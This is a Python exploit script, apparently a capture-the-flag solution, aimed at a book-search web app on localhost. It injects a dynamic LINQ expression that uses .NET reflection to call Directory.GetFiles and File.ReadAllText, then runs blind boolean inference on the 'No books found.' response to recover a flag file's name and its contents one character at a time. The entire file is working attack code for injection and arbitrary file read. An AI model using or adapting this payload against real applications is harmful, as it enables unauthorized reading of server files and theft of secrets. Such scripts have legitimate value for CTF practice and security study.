import httpx
import asyncio
from urllib.parse import quote_plus

URL = 'http://localhost:8080'
PARAM = '/Books?searchString='

class BaseAPI:
    def __init__(self, url=URL):
        self.c = httpx.AsyncClient(base_url=url)

    async def visit(self, param=PARAM, c=''):
        sqli = quote_plus(
            'Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.Array").DeclaredMethods.Where(x => x.Name == "GetValue").Skip(1).First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.IO.Directory").DeclaredMethods.Where(x => x.Name == "GetFiles").Skip(1).First().Invoke(null, new object[] { "/", "flag*.txt" }), new object[] { 0 }), new object[] { "/'+c+'" }).ToString()=="True" AND ("xx"="xx'
        )
        return await self.c.get(param + sqli)

    async def visit_flag(self, param=PARAM, filename='', c=''):
        sqli = quote_plus(
            'Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+".IO."+"File").DeclaredMethods.Where(x => x.Name == "ReadAllText").First().Invoke(null, new object[] { "/'+filename+'" }), new object[] { "' + c + '" }).ToString()=="True" AND ("xx"="xx'
        )
        return await self.c.get(param + sqli)

class API(BaseAPI):
    pass

async def worker(api):
    filename = ''
    flag = ''
    fuzz = 'flag_-01234567890abcdef.txt'
    fuzz_flag = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}'
    
    while not filename.endswith('.txt'):
        for c in fuzz:
            res = await api.visit(c=filename+c)
            if 'No books found.' in res.text:
                continue
            else:
                filename += c
                print(filename)
    
    while not flag.endswith('}'):
        for c in fuzz_flag:
            res = await api.visit_flag(filename=filename, c=flag+c)
            if 'No books found.' in res.text:
                continue
            else:
                flag += c
                print(flag)

async def main():
    api = API()
    await worker(api)

if __name__ == '__main__':
    asyncio.run(main())


